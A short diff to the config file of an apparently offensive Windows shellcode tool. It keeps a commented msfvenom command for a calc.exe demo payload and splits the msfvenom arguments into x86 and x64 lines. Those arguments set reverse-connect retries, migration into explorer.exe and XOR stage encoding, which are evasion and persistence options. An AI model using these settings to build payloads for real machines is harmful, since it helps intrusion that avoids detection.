@@ -6,4 +6,6 @@ platform: windows
 # default payload is shellcode i386 / spawn calc.exe
 # msfvenom -a x86 --platform Windows -p windows/exec cmd=calc.exe -b '\x00\xff'  -f hex -o payloads/calc.hex
 shellcodefile: calc.hex
-msfvenomargs: ReverseConnectRetries=255 EXITFUNC=thread EnableStageEncoding=true prependmigrate=true prependmigrateprocess=explorer.exe StageEncoder=x64/xor -b '\x00\xff'  -f hex
+msfvenomargs86: ReverseConnectRetries=255 EXITFUNC=thread EnableStageEncoding=true prependmigrate=true prependmigrateprocess=explorer.exe StageEncoder=x64/xor -b '\x00\xff'  -f hex
+msfvenomargs64: ReverseConnectRetries=255 EXITFUNC=thread EnableStageEncoding=true prependmigrate=true prependmigrateprocess=explorer.exe StageEncoder=x64/xor -b '\x00'  -f hex
+
